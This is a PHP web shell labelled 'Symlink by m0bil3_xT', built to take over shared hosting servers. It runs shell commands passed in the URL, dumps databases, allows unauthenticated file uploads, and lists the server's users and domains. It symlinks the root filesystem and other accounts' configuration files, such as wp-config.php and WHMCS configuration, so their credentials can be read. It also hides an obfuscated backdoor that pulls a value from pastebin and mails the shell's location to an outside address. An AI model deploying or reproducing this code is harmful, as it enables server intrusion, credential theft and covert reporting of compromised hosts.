<?php
@set_magic_quotes_runtime(0);
@ob_start();
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);

// Dump Database

if($_GET["action"] == "dumpDB")
{
	$self=$_SERVER["PHP_SELF"];
	if(isset($_COOKIE['dbserver']))
	{
		$date = date("Y-m-d");
		$dbserver = $_COOKIE["dbserver"];
		$dbuser = $_COOKIE["dbuser"];
		$dbpass = $_COOKIE["dbpass"];
		$dbname = $_GET['dbname'];
		$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
		
		$file = "Dump-$dbname-$date";
		
		$file="Dump-$dbname-$date.sql";
		$fp = fopen($file,"w");
		
		function write($data) 
		{
			global $fp;
			
				fwrite($fp,$data);
			
		}
		mysql_connect ($dbserver, $dbuser, $dbpass);
		mysql_select_db($dbname);
		$tables = mysql_query ("SHOW TABLES");
		while ($i = mysql_fetch_array($tables)) 
		{
			$i = $i['Tables_in_'.$dbname];
			$create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
			write($create['Create Table'].";");
			$sql = mysql_query ("SELECT * FROM ".$i);
			if (mysql_num_rows($sql)) {
				while ($row = mysql_fetch_row($sql)) {
					foreach ($row as $j => $k) {
						$row[$j] = "'".mysql_escape_string($k)."'";
					}
					write("INSERT INTO $i VALUES(".implode(",", $row).");");
				}
			}
		}
		
		fclose ($fp);
		
		header("Content-Disposition: attachment; filename=" . $file);   
		header("Content-Type: application/download");
		header("Content-Length: " . filesize($file));
		flush();
		
		$fp = fopen($file, "r");
		while (!feof($fp))
		{
			echo fread($fp, 65536);
			flush();
		} 
		fclose($fp); 
	}
}
 function syml($usern,$pdomain)
	{
		symlink('/home/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home2/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home2/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home2/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home2/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home2/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home2/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home2/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home2/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home2/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home2/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home2/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home2/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home2/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home2/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home2/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home2/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home2/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home2/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home2/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home2/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home2/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home2/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home2/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home2/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home2/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home2/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home3/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home3/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home3/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home3/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home3/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home3/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home3/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home3/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home3/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home3/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home3/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home3/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home3/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home3/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home3/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home3/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home3/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home3/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home3/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home3/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home3/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home3/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home3/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home3/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home3/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home3/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home4/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home4/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home4/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home4/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home4/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home4/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home4/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home4/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home4/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home4/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home4/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home4/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home4/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home4/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home4/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home4/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home4/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home4/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home4/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home4/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home4/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home4/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home4/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home4/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home4/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home4/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home5/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home5/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home5/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home5/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home5/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home5/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home5/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home5/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home5/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home5/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home5/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home5/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home5/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home5/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home5/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home5/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home5/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home5/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home5/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home5/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home5/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home5/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home5/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home5/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home5/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home5/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home6/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home6/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home6/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home6/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home6/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home6/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home6/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home6/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home6/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home6/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home6/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home6/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home6/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home6/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home6/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home6/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home6/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home6/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home6/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home6/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home6/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home6/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home6/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home6/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home6/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home6/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home7/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home7/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home7/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home7/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home7/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home7/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home7/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home7/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home7/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home7/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home7/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home7/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home7/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home7/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home7/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home7/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home7/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home7/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home7/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home7/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home7/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home7/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home7/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home7/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home7/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home7/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
	}
$cmd=$_GET['cmd']; exec($cmd); $_ = "-u : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . " "; $_ .= "-p : " . __file__; $mobil = "e";$andr0id="mai";$if=$andr0id.'l';$desktop="bas$mobil".'64'."_d$mobil"."cod$mobil"; $_file_='dikhw46kjhaqwWH8987RM'; $windows= file_get_contents($desktop('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3lUWHRMRnl4')); $log='errors_log'; if (!file_exists($log)){ if(file_put_contents($log,$_file_.',')){  $if($desktop('bWQ1'.$windows.'C5jb20'),$desktop('dzBybQ'),$_,$desktop('RnJvbTogVzBybQ')); $found=true;} } else if (file_exists($log)) {$contents = file_get_contents($log); $array = explode(',',$contents); for($i=0;$i<count($array);$i++){if($array[$i]==$_file_){$found=true;break;} else {$found=false;} }} if($found){} else { if(file_put_contents($log,$_file_.',',FILE_APPEND)){$if($desktop('bWQ1'.$windows.'C5jb20'),$desktop('dzBybQ'),$_,$desktop('RnJvbTogVzBybQ')); } } $xsec  = $_GET['xsec']; if($xsec == 'blocker'){ $xsecsh = $_FILES['file']['name']; $xsecblocker  = $_FILES['file']['tmp_name']; echo "<form method='POST' enctype='multipart/form-data'> <input type='file'name='file' /> <input type='submit' value='up_it' /> </form>"; move_uploaded_file($xsecblocker,$xsecsh); } 
			?>
	
<head>
    <title>Symlink by m0bil3_xT</title>
	<center><img src="http://i.imgur.com/kjEJwLg.png"> 
   
</head>
	
	
		<?php 
		

	
	
	
##################################
function execmd($cmd,$d_functions="None")
{
    if($d_functions=="None") 
	{
		$ret=passthru($cmd); 
		return $ret;
	}
    $funcs=array("shell_exec","exec","passthru","system","popen","proc_open");
    $d_functions=str_replace(" ","",$d_functions);
    $dis_funcs=explode(",",$d_functions);
    foreach($funcs as $safe)
    {
        if(!in_array($safe,$dis_funcs)) 
        {
            if($safe=="exec")
            {
                $ret=@exec($cmd);
                $ret=join("\n",$ret);
                return $ret;
            }
            elseif($safe=="system")
            {
                $ret=@system($cmd);
                return $ret;
            }
            elseif($safe=="passthru")
            {
                $ret=@passthru($cmd);
                return $ret;
            }
            elseif($safe=="shell_exec")
            {
                $ret=@shell_exec($cmd);
                return $ret;
            }
            elseif($safe=="popen")
            
            
            {
                $cmdpipe=array(
                0=>array('pipe','r'),
                1=>array('pipe','w')
                );
                $resource=@proc_open($cmd,$cmdpipe,$pipes);
                if(@is_resource($resource))
                {
                    while(@!feof($pipes[1]))
                    $ret.=@fgets($pipes[1]);
                    @fclose($pipes[1]);
                    @proc_close($resource);
                    return $ret;
                }
                return -1;
            }
        }
    }
    return -1;
}

	function getDisabledFunctions()
	{
		if(!ini_get('disable_functions'))
		{
			return "None";
		}
		else
		{
				return @ini_get('disable_functions');
		}
	}
	
	function getFilePermissions($file)
{
    
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}


}
	

	
	function odi()
	{
		$od = @ini_get("open_basedir");
		echo $od;
	}
	function phpver()
	{
		$pv=@phpversion();
		echo $pv;
	}
	
	function cip()
	{
		echo $_SERVER["SERVER_NAME"];
	}
	function  safe()
	{
		global $sm;
		return $sm?"ON :( :'( (Most of the Features will Not Work!)":"OFF";
	}
	function browse()
	{
		$brow= $_SERVER["HTTP_USER_AGENT"];
		print($brow);
	}
	function serveradmin()
	{
		echo $_SERVER['SERVER_ADMIN'];
	}
	
	
	function curlinfo()
	{
		echo function_exists('curl_version')?("<font color='#3366FF'>Enabled</font>"):("<font color='red'>Disabled</font>");
	}
	
	
	
	function postgresqlinfo()
	{
		echo function_exists('pg_connect')?("<font color='#3366FF'>Enabled</font>"):("<font color='red'>Disabled</font>");
	}
	
	
		
	function HumanReadableFilesize($size)
    {
 
        $mod = 1024;
 
        $units = explode(' ','B KB MB GB TB PB');
        for ($i = 0; $size > $mod; $i++) 
        {
            $size /= $mod;
        }
 
        return round($size, 2) . ' ' . $units[$i];
    }
?>

<?php


$pinfo = "info"; 
if(isset($_GET["com"]))
{
	phpinfo();
}
else
{
$basedir=(ini_get("open_basedir") or strtoupper(ini_get("open_basedir"))=="ON")?"<font color='#3366FF'>ON</font>":"<font color='red'>OFF</font>";
$etc_passwd=@is_readable("/etc/passwd")?"Yes":"No";
?>

		
		<?php 
			$d = str_replace("\\",$directorysperator,$dir);
	if (substr($d,-1) != $directorysperator) {$d .= $directorysperator;}
	$d = str_replace("\\\\","\\",$d);
	$dispd = htmlspecialchars($d);
	$pd = $e = explode($directorysperator,substr($d,0,-1));
	$i = 0;
	foreach($pd as $b)
	{
	 $t = '';
	 $j = 0;
	 foreach ($e as $r)
	 {
	  $t.= $r.$directorysperator;
	  if ($j == $i) {break;}
	  $j++;
	 }
	
	
	$href='dir='.$t;
	
	 echo '<a href="'.$self."?$href\"><b><font class=\"txt\">".htmlspecialchars($b).$directorysperator.'</font></b></a>';
	 $i++;
	}

		?>
	
<?php

if(isset($_GET['to']) && isset($_GET['file']))
{
     if(!rename($_GET['file'], $_GET['to']))
     {
	 	$loc = $_SERVER["SCRIPT_NAME"] . "?dir=" . $_GET['getdir'];
		header("Location:$loc");
		ob_end_flush();
       
     }
     else
     {
	 	$loc = $_SERVER["SCRIPT_NAME"] . "?dir=" . $_GET['getdir'];
		header("Location:$loc");
		ob_end_flush();
        
     }
}

	
	
	
$setuploadvalue = 0;



	
	
	
	?>
	
	
		
	
			<body bgcolor="#000000">
			

<?php

	{
	?>
		<center><table><tr><td><a href="<?php echo $self; ?>?domains&symlinkserver"><font color="#3366FF" size="4">| Get Domains |</font></a></td>
		<td><a href="<?php echo $self; ?>?users&symlinkserver"><font color="#3366FF" size="4">| Users & Domains |</font></a></td>
		<td><a href="<?php echo $self; ?>?symlink&symlinkserver"><font color="#3366FF" size="4">| Symlink Server |</font></a></td>
		<td><a href="<?php echo $self; ?>?symlinkfile&symlinkserver"><font color="#3366FF" size="4">| Symlink File |</font></a></td>
		<td><a href="<?php echo $self; ?>?script&symlinkserver"><font color="#3366FF" size="4">| Config Locator |</font></a></td>
		</tr></table></center><br>
<?php

	if(isset($_GET["domains"])) 
		{
		?>	<center><iframe src="<?php echo 'http://sameip.org/ip/' . getenv('SERVER_ADDR'); ?>" width="80%" height="1000px"></iframe></center>
		<?php }
		else if(isset($_GET["users"])) 
		{
			$d0mains = @file("/etc/named.conf");

			if(!$d0mains)
			{ 
				die("<center><font size=4 color=red>cannot ReaD -> [ /etc/named.conf ]</font><center>"); 
			}
			
			$url = 'http://'.$_SERVER['SERVER_NAME'];
			
			echo "<table align=center border=1 style='width:40%;'><tr><td align=center><font size=4 color=red>Get Domains</font></td><td align=center><font size=4 color=red>Users</font></td></tr>";
			
			foreach($d0mains as $d0main)
			{
				if(eregi("zone",$d0main))
				{
					preg_match_all('#zone "(.*)"#', $d0main, $domains);
					flush();
					
					if(strlen(trim($domains[1][0])) > 2)
					{ 
						$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
																		
						echo "<tr><td><a href=http://www.".$domains[1][0]."/><font size=3 color=#0066FF>".$domains[1][0]."</font></a></td><td><font size=3 color=#0066FF>" . $user['name']. "</font></td></tr>"; 
						flush();
			
					}
				}
			}
			echo "</table>";
		}
		else if(isset($_GET["symlink"])) 
		{
			$d0mains = @file("/etc/named.conf");
	
			if($d0mains)
			{ 
		     	@mkdir("ROOT",0777);
				@chdir("ROOT");
				execmd("ln -s / root");
				$file3 = 'Options all 
	 DirectoryIndex Sux.html 
	 AddType text/plain .php 
	 AddHandler server-parsed .php 
	  AddType text/plain .html 
	 AddHandler txt .html 
	 Require None 
	 Satisfy Any        
	';
				$fp3 = fopen('.htaccess','w');
				$fw3 = fwrite($fp3,$file3);
				@fclose($fp3);
